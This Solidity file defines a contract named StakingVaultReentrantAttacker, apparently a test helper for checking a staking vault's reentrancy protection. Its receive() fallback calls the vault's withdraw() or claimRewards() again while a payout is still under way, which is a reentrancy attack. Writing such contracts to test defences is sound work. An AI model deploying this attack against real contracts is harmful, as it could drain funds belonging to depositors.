// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IStakingVault {
    function stake(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function claimRewards() external;
}

contract StakingVaultReentrantAttacker {
    IStakingVault private immutable vault;
    IERC20 private immutable token;
    uint256 private attackAmount;
    bool private attackRewards;

    constructor(address vault_, address token_) {
        vault = IStakingVault(vault_);
        token = IERC20(token_);
    }

    function stakeOnly(uint256 amount) external {
        token.approve(address(vault), amount);
        vault.stake(amount);
    }

    function attackWithdraw(uint256 amount) external {
        attackAmount = amount;
        attackRewards = false;
        token.approve(address(vault), amount);
        vault.stake(amount);
        vault.withdraw(amount);
    }

    function attackClaimRewards() external {
        attackRewards = true;
        vault.claimRewards();
    }

    receive() external payable {
        if (attackRewards) {
            vault.claimRewards();
        } else {
            vault.withdraw(attackAmount);
        }
    }
}
